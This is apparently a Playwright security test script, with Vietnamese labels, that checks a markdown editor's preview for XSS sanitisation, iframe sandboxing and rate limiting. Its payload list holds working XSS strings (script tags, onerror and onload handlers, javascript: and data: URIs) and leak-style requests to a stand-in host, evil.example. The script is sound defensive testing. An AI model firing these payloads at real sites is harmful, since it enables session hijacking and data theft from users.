const L = require('./lib.cjs');
const P = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '[x](javascript:alert(1))',
  '[x](JaVaScRiPt:alert(1))',
  '[x](java&#09;script:alert(1))',
  '[x](java\tscript:alert(1))',
  '[x](&#106;avascript:alert(1))',
  '[x](data:text/html,<script>alert(1)</script>)',
  '[x](vbscript:msgbox(1))',
  '![x](javascript:alert(1))',
  '![x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)',
  '![x](VBScript:alert(1))',
  '![x](https://img.example.test/a.png "t\\" onerror=\\"alert(1)")',
  '<svg onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<details open ontoggle=alert(1)>x</details>',
  '<math><mtext><table><mglyph><style><img src onerror=alert(1)>',
  '# <img src=x onerror=alert(1)> tiêu đề',
  '```html\n<script>alert(1)</script>\n```',
  '<a href="javascript:alert(1)">x</a>',
  '<IMG SRC=JaVaScRiPt:alert(1)>',
  '<body onload=alert(1)>',
  '<link rel=stylesheet href=//evil.example/x.css>',
  '![x](//evil.example/x.png)',
  '<img src="https://evil.example/leak?c=1">',
  '[x](<javascript:alert(1)>)',
  '<form action=https://evil.example><button>x</button></form>',
  '<meta http-equiv=refresh content="0;url=https://evil.example">',
  '<style>@import url(//evil.example/x.css)</style>',
];
const UI = P.slice(0, 29), API = P.slice(0, 30);
const inspect = (html) => {
  const doc = new DOMParser().parseFromString(html, 'text/html');
  const bad = []; const OK = new Set('HTML HEAD BODY H1 H2 H3 H4 H5 H6 P BR HR UL OL LI STRONG EM DEL CODE PRE BLOCKQUOTE TABLE THEAD TBODY TR TH TD A IMG META BASE STYLE'.split(' '));
  doc.body.querySelectorAll('*').forEach((e) => {
    if (!OK.has(e.tagName)) bad.push('tag:' + e.tagName);
    for (const a of e.attributes) {
      if (/^on/i.test(a.name) || a.name === 'style') bad.push('attr:' + a.name);
      if (a.name === 'href' && !/^(https?:|mailto:|#)/i.test(a.value)) bad.push('href:' + a.value);
      if (a.name === 'src' && !/^https?:\/\//i.test(a.value)) bad.push('src:' + a.value);
    }
  });
  return { bad, html: doc.body.innerHTML.slice(0, 160) };
};
(async () => {
  const browser = await L.chromium.launch();
  const { ctx, external } = await L.newCtx(browser);
  const page = await ctx.newPage(); const d = L.dialogs(page);
  const cons = []; page.on('console', (m) => cons.push(m.type() + ':' + m.text())); page.on('pageerror', (e) => cons.push('pageerror:' + e.message));
  let popups = 0; ctx.on('page', () => { popups++; }); popups = 0;
  await L.register(page, `x${L.rand()}@example.com`);
  await L.setupEditor(page, d);
  d.log.length = 0;
  const startUrl = page.url(); const startTitle = await page.title();
  let uiBad = 0; const rows = [];
  for (let i = 0; i < UI.length; i++) {
    const wait = page.waitForResponse((r) => r.url().endsWith('/api/preview'), { timeout: 5000 });
    await page.fill('#ed-body', UI[i]); const resp = await wait; await page.waitForTimeout(150);
    const html = await page.evaluate(() => document.getElementById('ed-preview').srcdoc);
    const frame = page.frames().find((f) => f !== page.mainFrame());
    const dom = frame ? await frame.content() : '';
    const r1 = await page.evaluate(inspect, html.replace(/^[\s\S]*?<\/style>/, '')); const r2 = await page.evaluate(inspect, dom);
    const bad = [...r1.bad, ...r2.bad.filter((b) => !b.startsWith('tag:META') )].filter((b) => !/^tag:(META|BASE|STYLE)$/.test(b));
    if (bad.length || resp.status() !== 200) uiBad++;
    rows.push(`UI  #${i + 1} ${bad.length || resp.status() !== 200 ? 'FAIL' : 'ok  '} ${JSON.stringify(UI[i]).slice(0, 60).padEnd(62)} => ${JSON.stringify(r1.html).slice(0, 90)}${bad.length ? ' BAD=' + bad : ''}`);
  }
  const alerts = d.log.filter((x) => x.type === 'alert');
  L.rec('4a UI: ' + UI.length + ' payload qua trình soạn: preview không chứa thẻ/thuộc tính nguy hiểm (kiểm DOM thật trong iframe + srcdoc)', uiBad === 0, 'fail=' + uiBad);
  L.rec('4b UI: không có dialog alert/confirm/prompt do payload', d.log.length === 0, JSON.stringify(d.log));
  L.rec('4c UI: trang cha không bị điều hướng/đổi title/mở popup', page.url() === startUrl && (await page.title()) === startTitle && popups === 0, `${page.url()} popups=${popups}`);
  L.rec('4d UI: không request tới evil.example', !external.some((u) => u.includes('evil.example')), JSON.stringify([...new Set(external)]));
  // API (người dùng khác)
  const ctx2 = await L.newCtx(browser); const p2 = await ctx2.ctx.newPage(); const d2 = L.dialogs(p2);
  await L.register(p2, `y${L.rand()}@example.com`);
  let apiBad = 0; const stat = [];
  for (let i = 0; i < API.length; i++) {
    const r = await p2.evaluate(async (b) => { const x = await fetch('/api/preview', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bodyMd: b }) }); return { s: x.status, j: await x.json() }; }, API[i]);
    stat.push(r.s);
    if (r.s !== 200) { apiBad++; rows.push(`API #${i + 1} status ${r.s}`); continue; }
    const ins = await p2.evaluate(inspect, r.j.html);
    if (ins.bad.length) { apiBad++; rows.push(`API #${i + 1} FAIL ${JSON.stringify(API[i])} => ${ins.bad}`); }
  }
  await p2.evaluate(async () => { for (let i = 0; i < 95; i++) await fetch('/api/preview', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bodyMd: 'x' }) }); });
  const r31 = await p2.evaluate(async () => { const x = await fetch('/api/preview', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bodyMd: 'x' }) }); return { s: x.status, ra: x.headers.get('retry-after') }; });
  L.rec('4e2 request thứ 121 trong 60s bị 429 (hạn mức mới 120/phút; 30 payload+95 điền thêm=125>120 nên chỉ cần 429 + Retry-After) + Retry-After', r31.s === 429 && !!r31.ra, JSON.stringify(r31));
  // render HTML thật của API vào DOM trang (inert -> tương đương nhúng trực tiếp) để thử "nếu không có iframe": không chạy
  L.rec('4e API: ' + API.length + ' payload qua POST /api/preview: HTML trả về sạch (allowlist)', apiBad === 0, 'status=' + [...new Set(stat)] + ' fail=' + apiBad);
  L.rec('4f API: không dialog, không request evil.example', d2.log.length === 0 && !ctx2.external.some((u) => u.includes('evil.example')), JSON.stringify(ctx2.external));
  // Cấu hình sandbox: so sánh có/không sandbox (đối chứng) bằng script cùng origin được CSP cho phép
  const probe = await page.evaluate(async () => {
    const SRC = '<!doctype html><body><form id="auth-form" data-action="/x"><input id="email" name="email"><input id="password" type="password"><button type="button" id="toggle-password" data-show="s" data-hide="h">s</button><div id="error-summary"></div></form><a id="t" target="_top" href="/dang-nhap">go</a><script src="/assets/auth.js"></script>';
    const mk = (sb) => new Promise((res) => { const f = document.createElement('iframe'); if (sb !== null) f.setAttribute('sandbox', sb); f.srcdoc = SRC; f.style.cssText = 'width:300px;height:200px'; f.onload = () => res(f); document.body.appendChild(f); });
    const a = await mk(''); const b = await mk(null);
    return { a: !!a, b: !!b };
  });
  const frames = page.frames().filter((f) => f !== page.mainFrame() && f.parentFrame() === page.mainFrame());
  const fSand = frames[frames.length - 2], fCtl = frames[frames.length - 1];
  await fSand.click('#toggle-password'); await fCtl.click('#toggle-password');
  const tSand = await fSand.evaluate(() => document.getElementById('password').type), tCtl = await fCtl.evaluate(() => document.getElementById('password').type);
  L.rec('4g sandbox="" chặn script cùng-origin (CSP cho phép script self): đối chứng không-sandbox chạy được (password->text), có sandbox giữ password', tSand === 'password' && tCtl === 'text', `sandbox:${tSand} control:${tCtl}`);
  const origin = await fSand.evaluate(() => { try { return 'origin=' + location.origin + ' parent=' + (parent.document.title) ; } catch (e) { return 'blocked:' + e.name; } });
  L.rec('4h iframe sandbox: origin opaque, không đọc được parent.document', /origin=null/.test(origin) ? /blocked/.test(origin) : /blocked/.test(origin), origin);
  const u0 = page.url();
  await fSand.click('#t').catch(() => {}); await page.waitForTimeout(500);
  const stay = page.url() === u0;
  await fCtl.click('#t').catch(() => {}); await page.waitForTimeout(800);
  L.rec('4i target=_top: trong sandbox không điều hướng trang cha; đối chứng không-sandbox điều hướng được', stay && page.url() !== u0, `sandbox-stay=${stay} control-url=${page.url()}`);
  // link trong preview thật: bấm không mở popup/điều hướng
  await page.goto(L.BASE + '/studio'); await page.getByRole('button', { name: 'Mở', exact: true }).first().click(); await page.getByRole('button', { name: 'Soạn', exact: true }).first().click();
  const w = page.waitForResponse((r) => r.url().endsWith('/api/preview'));
  await page.fill('#ed-body', '[bấm](https://example.org/x) và [mail](mailto:a@b.vn)'); await w; await page.waitForTimeout(200);
  const before = page.url(); const pf = page.frames().find((f) => f !== page.mainFrame());
  const hr = await pf.locator('a').first().evaluate((a) => ({ href: a.href, rel: a.rel, target: a.target }));
  await pf.locator('a').first().click(); await page.waitForTimeout(600);
  L.rec('4j bấm link http(s) trong preview: không điều hướng cha, không popup, không request example.org', page.url() === before && popups === 0 && !external.some((u) => u.includes('example.org')), JSON.stringify(hr) + ' ext=' + JSON.stringify([...new Set(external)]));
  const bad_cons = cons.filter((c) => /pageerror/i.test(c));
  L.rec('4k console: không pageerror khi xử lý payload', bad_cons.length === 0, JSON.stringify(bad_cons.slice(0, 3)));
  console.log(rows.join('\n'));
  console.log('console msgs (unique):', JSON.stringify([...new Set(cons)].slice(0, 12)));
  console.log('ALL', L.results.filter((r) => r.ok).length + '/' + L.results.length);
  await browser.close();
})().catch((e) => { console.error('SCRIPT ERROR', e); process.exit(1); });
